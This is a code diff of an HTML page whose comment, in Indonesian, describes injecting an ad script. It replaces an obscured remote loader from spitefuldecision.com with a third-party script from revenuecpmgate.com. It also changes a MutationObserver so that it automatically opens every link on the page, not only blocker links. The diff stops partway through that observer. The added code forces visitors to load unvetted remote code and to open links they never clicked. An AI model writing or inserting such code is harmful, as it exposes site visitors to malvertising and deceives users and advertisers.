@@ -14,25 +14,14 @@
 </head>
 <body>
   <!-- Inject script iklan -->
-  <script>
-    (function(inu){
-      var d = document,
-          s = d.createElement('script'),
-          l = d.scripts[d.scripts.length - 1];
-      s.settings = inu || {};
-      s.src = "\/\/spitefuldecision.com\/bzX.VYsmd\/Gpli0WYBWUcg\/be_mV9Xu\/Z\/U\/lBkhPuTJYI2DN\/jaA\/wzNAzUgntFNqjEYF2-MXDUAN3nOdQ_";
-      s.async = true;
-      s.referrerPolicy = 'no-referrer-when-downgrade';
-      l.parentNode.insertBefore(s, l);
-    })({})
-  </script>
+  <script type="text/javascript" src="//pl27306367.revenuecpmgate.com/fe/08/62/fe08620747208b744858074eea1eef05.js"></script>
 
-  <!-- Observer untuk auto buka semua link vast-blocker di halaman yang sama -->
+  <!-- Observer untuk auto buka semua link di halaman yang sama -->
   <script>
     const opened = new Set();
 
     const observer = new MutationObserver(() => {
-      const links = document.querySelectorAll('a.vast-blocker[href]');
+      const links = document.querySelectorAll('a[href]');
       links.forEach(link => {
         if (!opened.has(link.href)) {
           opened.add(link.href);
